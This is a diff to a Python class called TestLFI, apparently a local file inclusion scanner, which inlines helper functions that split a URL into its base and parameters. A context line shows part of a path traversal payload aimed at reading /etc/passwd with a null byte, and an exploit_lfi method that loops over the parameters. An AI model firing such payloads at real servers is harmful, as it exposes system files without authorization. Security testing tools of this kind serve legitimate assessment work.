@@ -61,19 +61,6 @@ class TestLFI:
             + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00"
         ]
 
-    def split_params(url):
-        """
-        Split the url into the base url and the parameters
-        """
-
-        split_url = url.split("?")
-        return split_url[0], split_url[1]
-
-    def get_params(params):
-        """
-        Get the parameters from the url
-        """
-        return params.split("&")
 
     def exploit_lfi(self, base_url, url_params):
         for param in url_params:
@@ -104,12 +91,9 @@ class TestLFI:
         Test for LFI
         """
         # split the url into the base url and the parameters
-        base_url, params = self.split_params(url)
+        base_url = url.split("?")[0]
+        params = url.split("?")[1]
         # get the parameters from the url
-        params_dict = self.get_params(params)
-        # get the url_no_params
-        url_no_params = base_url
-        # get the url_params
-        url_params = params_dict
+        params_dict = params.split("&")
         # exploit the lfi
-        self.exploit_lfi(url_no_params, url_params)
+        self.exploit_lfi(base_url, params_dict)
